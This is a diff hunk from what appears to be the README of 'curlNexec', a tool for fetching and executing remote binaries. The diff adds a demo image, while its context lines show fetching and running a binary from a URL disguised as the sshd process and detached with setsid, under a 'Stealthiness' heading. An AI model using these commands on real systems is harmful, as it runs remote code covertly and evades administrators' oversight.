@@ -12,6 +12,7 @@
  - execute binary with specified program name: `curlNexec -n /usr/sbin./sshd <binary_raw_url>`
  - detach program execution from `tty`: ` setsid curlNExec [...]` 
 
+<img align=center href="https://github.com/ariary/curlNexec/blob/main/img/curlNexec.gif">Demo</img>
 
 ## Stealthiness story 
 
